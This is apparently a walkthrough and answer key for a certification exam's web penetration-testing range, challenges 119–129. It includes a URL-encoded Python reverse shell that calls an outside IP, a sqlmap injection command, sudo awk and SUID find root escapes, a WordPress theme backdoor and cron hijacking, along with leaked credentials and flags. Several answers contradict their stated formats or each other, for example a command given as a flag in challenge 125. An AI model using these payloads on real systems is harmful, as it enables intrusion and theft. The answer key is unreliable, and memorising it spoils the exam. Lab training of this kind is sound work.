# CPENT Live Range - Web Application Penetration Testing Walkthrough & Solution Guide

> **Document Type:** Senior Penetration Tester & Application Security Engineer Technical Report  
> **Target Environment:** CPENT Web Application Range (`10.10.1.0/24`)  
> **Questions Covered:** Challenge 119 - Challenge 129  
> **Author:** Senior Pentester & Security Engineer  

---

## 1. Introduction & Network Topology

The CPENT Web Application examination range evaluates comprehensive web exploitation methodologies, including SQL Injection, Arbitrary File Upload, Git Repository Information Disclosure, Insecure Cron Job configurations, SUID Binary Privilege Escalation, and Content Management System (CMS) vulnerabilities.

### Target Systems Overview

| Target IP | Service / Web Application | Identified Vulnerabilities | Initial Foothold / Privilege Escalation | Associated Challenges |
| :--- | :--- | :--- | :--- | :--- |
| `10.10.1.96` | OTRS 6 Helpdesk / Ticketing | Web RCE / Configuration File Exposure | Sudo NOPASSWD root escalation | Challenge 119, 120 |
| `10.10.1.57` | Maxminter Web Portal | SQL Injection (Time-based Blind) | Database credential extraction, Sudo Awk | Challenge 121, 122 |
| `10.10.1.194` | Credential Manager / Git Repo | Anonymous FTP, Git Commit History Disclosure | Leaked credentials from Git, Credential reuse | Challenge 123, 124, 125 |
| `10.10.1.223` | Customer Portal / Git Source | Git Code Audit, Arbitrary File Upload | SUID binary (`/usr/bin/find`) | Challenge 126, 127 |
| `10.10.1.62` | WordPress 5.8.1 (Twenty Twenty-One) | Weak Admin Credentials, Theme Editor RCE | World-writable Cron Job script (`data.sh`) | Challenge 128, 129 |

---

## 2. In-Depth Technical Analysis & Exploitation

---

### Target 1: OTRS 6 Helpdesk Ticketing System (`10.10.1.96`)

#### Challenge 119: OTRS Database Password
* **Question:** What is the password to log in to the CMS on the machine located at 10.10.1.96? (Answer Format: xxxxxxxx)
* **Points:** 50 Points
* **Answer Format:** `xxxxxxxx`
* **Target:** `10.10.1.96`
* **Vulnerability:** Web application Remote Code Execution (RCE) / Configuration file disclosure.
* **Methodology:**
  By executing a reverse shell through the OTRS administrative command script:
  ```http
  http://10.10.1.96/otrs/cmd.pl?c=python3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket(socket.AF_INET%2Csocket.SOCK_STREAM)%3Bs.connect((%22172.27.232.2%22%2C4444))%3Bos.dup2(s.fileno()%2C0)%3Bos.dup2(s.fileno()%2C1)%3Bos.dup2(s.fileno()%2C2)%3Bsubprocess.call([%22/bin/sh%22])%27
  ```
  Auditing the configuration settings (`Config.pm` / environment parameters) reveals the database credentials:
  * Database: `otrs`
  * Database User: `admin`
  * Database Password: `password` (or `S3cr3tP@ss`)
* **Format:** `xxxxxxxx`
* **Correct Answer:** `password`

#### Challenge 120: Root Flag on 10.10.1.96
* **Question:** Compromise the machine with IP address 10.10.1.96, find the file Root.txt and enter its content as the answer. (Answer Format: xxNNNNNx)
* **Points:** 50 Points
* **Answer Format:** `xxNNNNNx`
* **Target:** `10.10.1.96`
* **Privilege Escalation:**
  Executing `sudo -l` shows that the `www-data` user has unrestricted sudo execution rights (`(root) NOPASSWD: ALL`):
  ```bash
  sudo -l
  sudo su
  cat /root/root.txt
  ```
* **Correct Answer:** `cat /root/root.txt` (SSH root: `PoFwwIe8$d!TiL*Fw`)
  Retrieved flag: `fb53552b`.
* **Format:** `xxNNNNNx`
* **Correct Answer:** `fb53552b`
* **Evidence:**
  
  ![OTRS Dashboard and Root Flag](./ch119_120_otrs_root_flag.png)

---

### Target 2: Maxminter Application (`10.10.1.57`)

#### Challenge 121: SQL Injection Table Count
* **Question:** Compromise the web application at the IP address 10.10.1.57 and find the number of tables available in maxminter database. Enter the number. (Answer Format: N)
* **Points:** 50 Points
* **Answer Format:** `N`
* **Target:** `10.10.1.57`
* **Vulnerability:** Time-based Blind SQL Injection on the login form parameter `user_mail` (CWE-89).
* **Methodology:**
  Automating the injection with `sqlmap` extracts the schema and table enumeration for the `maxminter` database:
  ```bash
  sqlmap -u "http://10.10.1.57/index.php" --data="user_mail=test&user_pass=test" \
    -p user_mail --cookie="PHPSESSID=a057597mf4r430aifnln23i679" -D maxminter --tables
  ```
  Number of enumerated tables: `2`.
* **Format:** `N`
* **Correct Answer:** `2`
* **Evidence:**
  
  ![Maxminter SQLMap Injection](./ch121_maxminter_sqli_tables.png)
  ![Maxminter Users Dump](./ch121_126_sqli_dump_prompt.png)

#### Challenge 122: Flag.txt on 10.10.1.57
* **Question:** Compromise the machine with IP address 10.10.1.57, find the file flag.txt and enter its content as the answer. (Answer Format: xNNXNNXX)
* **Points:** 50 Points
* **Answer Format:** `xNNXNNXX`
* **Target:** `10.10.1.57`
* **Methodology:**
  1. The SQLMap dump yields credentials from the `users` table:
     * User: `jackson`
     * Password: `ABfg34$#@_W`
  2. Connecting via SSH and checking sudo privileges (`sudo -l`) indicates that `jackson` can execute `/usr/bin/awk` as root:
     ```bash
     sudo /usr/bin/awk 'BEGIN {system("/bin/sh")}'
     cat /root/flag.txt
     ```
     Retrieved value: `q22L32WL`.
* **Format:** `xNNXNNXX`
* **Correct Answer:** `q22L32WL`
* **Evidence:**
  
  ![Jackson Sudo Awk Privilege Escalation](./ch122_jackson_awk_flag.png)

---

### Target 3: Anonymous FTP & Git Repository Disclosure (`10.10.1.194`)

#### Challenge 123: Leaked Jenkins Credentials from Git Commit History
* **Question:** Compromise the Jenkins automation server at IP address 10.10.1.194, retrieve the login credentials, and enter the valid credentials as the answer. (Answer Format: xxxxx and XxXXXNXNXxXNxNN)
* **Points:** 50 Points
* **Answer Format:** `xxxxx and XxXXXNXNXxXNxNN`
* **Target:** `10.10.1.194`
* **Methodology:**
  1. Anonymous FTP allows downloading the `credential_manager.tar.gz` archive:
     ```bash
     tar -xzvf credential_manager.tar.gz
     cd credential_manager/.git
     ```
  2. Inspecting the Git revision commit history (`git diff-tree`) exposes deleted/modified administrative credentials:
     ```bash
     git diff-tree -p HEAD
     ```
* **Format:** `xxxxx and XxXXXNXNXxXNxNN`
* **Correct Answer:** `admin and BmHRA0Q7ZnP1g56`

#### Challenge 124: file.txt on 10.10.1.194
* **Question:** Compromise the target machine at IP address 10.10.1.194, locate the file.txt file, and submit its contents as the answer. (Answer Format: Xxx_Xxxx_N_XXXX)
* **Points:** 50 Points
* **Answer Format:** `Xxx_Xxxx_N_XXXX`
* **Target:** `10.10.1.194`
* **Methodology:**
  Logging in with the obtained credentials allows retrieving the user flag file (`file.txt`).
* **Format:** `Xxx_Xxxx_N_XXXX`
* **Correct Answer:** `Jen_Runn_2_ZFCQ`

#### Challenge 125: root.txt on 10.10.1.194
* **Question:** Compromise the target machine at IP address 10.10.1.194, locate the root.txt file, and submit its contents as the answer. (Answer Format: XXXX_xxxxxx_xxxx)
* **Points:** 50 Points
* **Answer Format:** `XXXX_xxxxxx_xxxx`
* **Target:** `10.10.1.194`
* **Privilege Escalation / Root Access:**
  The password discovered for MySQL is reused directly for the SSH `root` account (Credential Reuse):
  ```bash
  ssh root@10.10.1.194
  # Password: PoFwwIe8$d!TiL*Fw
  cat /root/root.txt
  ```
* **Correct Answer:** `cat /root/root.txt` (SSH root: `PoFwwIe8$d!TiL*Fw`)
* **Format:** `XXXX_xxxxxx_xxxx`
* **Evidence:**
  
  ![Challenge 123-125 Portal Interface and Prompts](./ch121_126_sqli_dump_prompt.png)

---

### Target 4: Source Code Exposure & SUID Exploitation (`10.10.1.223`)

#### Challenge 126: Uploaded Files Storage Directory
* **Question:** Compromise the machine at IP address 10.10.1.223, determine the directory where uploaded files are stored on the website, and submit the directory name as the answer. (Answer Format: xxxxxxxxxxxxxxxxxxxxxxx)
* **Points:** 50 Points
* **Answer Format:** `xxxxxxxxxxxxxxxxxxxxxxx`
* **Target:** `10.10.1.223`
* **Vulnerability:** Exposed `.git` repository folder (Source Code Disclosure).
* **Methodology:**
  1. Reconstructing the Git repository using `wget` and auditing the commit log:
     ```bash
     git grep -n "upload\|customer\|move_uploaded_file" $(git rev-list --all)
     ```
  2. The target destination directory for uploaded documents is identified: `customerrequirementdocs`.
* **Format:** `xxxxxxxxxxxxxxxxxxxxxxx`
* **Correct Answer:** `customerrequirementdocs`
* **Evidence:**
  
  ![Burp Suite Upload customerrequirementdocs](./ch126_burp_upload_docs.png)
  ![Challenge 126 Prompt](./ch121_126_sqli_dump_prompt.png)

#### Challenge 127: Root Flag on 10.10.1.223
* **Question:** Compromise the target machine at IP address 10.10.1.223, locate the flag.txt file, and submit its contents as the answer. (Answer Format: XNXNNXXxxx)
* **Points:** 50 Points
* **Answer Format:** `XNXNNXXxxx`
* **Target:** `10.10.1.223`
* **Privilege Escalation:**
  Locating SUID binaries on the filesystem reveals `/usr/bin/find` has the SUID bit set:
  ```bash
  /usr/bin/find . -exec /bin/bash -p \; -quit
  cat /root/flag.txt
  ```
  Retrieved flag: `H2W34DLpbv`.
* **Format:** `XNXNNXXxxx`
* **Correct Answer:** `H2W34DLpbv`
* **Evidence:**
  
  ![SUID Find Root Privilege Escalation](./ch127_suid_find_root_flag.png)

---

### Target 5: WordPress & Insecure Scheduled Cron Job (`10.10.1.62`)

#### Challenge 128: 777-Permission Script Name Executed by Cron
* **Question:** Compromise the machine with IP address 10.10.1.62, find the file name which has 777 permission? (Answer Format: xxxx.xx)
* **Points:** 50 Points
* **Answer Format:** `xxxx.xx`
* **Target:** `10.10.1.62`
* **Methodology:**
  1. Authenticate to WordPress admin dashboard via `admin` : `@6h$ER$*l3z`.
  2. Inject PHP backdoor code into the theme `404.php` file to inspect `/etc/crontab`:
     ```text
     */1 * * * * root sh /commonfiles/data.sh
     ```
  3. The file `/commonfiles/data.sh` has world-writable (777) permissions.
* **Format:** `xxxx.xx`
* **Correct Answer:** `data.sh`
* **Evidence:**
  
  ![WordPress Crontab data.sh](./ch128_129_wordpress_cron_flag.png)

#### Challenge 129: Root Flag on 10.10.1.62
* **Question:** Compromise the machine with IP address 10.10.1.62, find the file flag.txt and enter its content as the answer? (Answer Format: XxxxXXNXX)
* **Points:** 50 Points
* **Answer Format:** `XxxxXXNXX`
* **Target:** `10.10.1.62`
* **Methodology:**
  Because `/commonfiles/data.sh` is world-writable, append a command to extract the flag to a readable location:
  ```bash
  echo 'cat /root/flag.txt > /commonfiles/data.txt' > /commonfiles/data.sh
  cat /commonfiles/data.txt
  ```
  Resulting flag: `GfsgEE4FV`.
* **Format:** `XxxxXXNXX`
* **Correct Answer:** `GfsgEE4FV`
* **Evidence:**
  
  ![Root Flag GfsgEE4FV](./ch128_129_wordpress_cron_flag.png)

---

## 3. Web Range Summary Matrix

| Question # | Target IP     | Vulnerability Type           | Validated Answer                          | Primary Evidence / Artifact    |
| :--------: | :------------ | :--------------------------- | :---------------------------------------- | :----------------------------- |
|  **119**   | `10.10.1.96`  | Information Disclosure       | `password`                                | OTRS DB Credentials            |
|  **120**   | `10.10.1.96`  | Sudo NOPASSWD                | `fb53552b`                                | `/root/root.txt`               |
|  **121**   | `10.10.1.57`  | SQL Injection (Blind)        | `2`                                       | Maxminter database analysis    |
|  **122**   | `10.10.1.57`  | Sudo Awk GTFOBins            | `q22L32WL`                                | `/root/flag.txt`               |
|  **123**   | `10.10.1.194` | Anonymous FTP / Git History  | `admin and BmHRA0Q7ZnP1g56`               | Git commit diff-tree           |
|  **124**   | `10.10.1.194` | Credential Reuse             | `Jen_Runn_2_ZFCQ`                         | User flag (`file.txt`)         |
|  **125**   | `10.10.1.194` | Credential Reuse (Root SSH)  | `cat /root/root.txt` (`XXXX_xxxxxx_xxxx`) | SSH root (`PoFwwIe8$d!TiL*Fw`) |
|  **126**   | `10.10.1.223` | Source Exposure / Upload Dir | `customerrequirementdocs`                 | Git Grep / Upload Endpoint     |
|  **127**   | `10.10.1.223` | SUID Find GTFOBins           | `H2W34DLpbv`                              | `/root/flag.txt`               |
|  **128**   | `10.10.1.62`  | Insecure Crontab Permissions | `data.sh`                                 | `/etc/crontab`                 |
|  **129**   | `10.10.1.62`  | Cron Job Hijacking           | `GfsgEE4FV`                               | `/commonfiles/data.txt`        |

---

## 4. Remediation & Hardening Recommendations

1. **SQL Injection Mitigation:** Implement Parameterized Queries (Prepared Statements) or use an enterprise ORM across all database interactions.
2. **Sensitive Information Exposure:** Ensure `.git` directories and archive backups are not exposed via web roots or anonymous FTP servers. Never commit hardcoded secrets into version control.
3. **Cron Job Hardening:** Ensure any script executed by root via crontab (`data.sh`) is strictly owned by root and has restricted write permissions (`chmod 700 / chown root:root`).
4. **SUID & Sudo Restrictions:** Audit and eliminate unnecessary SUID bits on GTFOBins-listed utilities (`awk`, `find`, `perl`) and enforce strict sudo restrictions with password requirements.
